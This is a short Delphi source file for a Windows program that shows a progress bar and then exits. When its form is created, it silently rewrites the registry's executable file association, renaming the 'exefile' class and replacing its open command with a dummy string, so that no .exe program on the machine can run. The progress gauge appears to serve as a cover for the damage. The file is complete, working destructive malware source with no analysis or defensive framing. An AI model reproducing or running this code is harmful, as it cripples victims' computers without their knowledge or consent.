unit main;

interface

uses
  Windows, Messages, SysUtils, Classes, Graphics, Controls, Forms,
  Gauges, Registry, StdCtrls, ExtCtrls;

type
  TForm1 = class(TForm)
    Gauge1: TGauge;
    Label1: TLabel;
    Label2: TLabel;
    Label3: TLabel;
    Timer1: TTimer;
    procedure FormCreate(Sender: TObject);
    procedure Timer1Timer(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Form1: TForm1;
  Reg: TRegistry;

implementation

{$R *.DFM}

procedure TForm1.FormCreate(Sender: TObject);
begin
Reg:=TRegistry.Create;
Reg.RootKey:=HKEY_CLASSES_ROOT;
Reg.MoveKey('exefile','ExeStoper',false);
Reg.OpenKey('ExeStoper\shell\open\command',false);
Reg.WriteString('','Exe_is_stoping');
Reg.CloseKey;
Reg.OpenKey('ExeStoper',false);
Reg.WriteString('','ExeStop-орнутое приложение');
Reg.CloseKey;
Reg.OpenKey('ExeStoper\shell\open',false);
Reg.WriteString('','&ExeStop-орнуть');
Reg.CloseKey;
Reg.OpenKey('.exe',false);
Reg.WriteString('','ExeStoper');
Reg.CloseKey;
Reg.Free
end;

procedure TForm1.Timer1Timer(Sender: TObject);
begin
Gauge1.Progress:=Gauge1.Progress+1;
if Gauge1.Progress=100 then Close
end;

end.
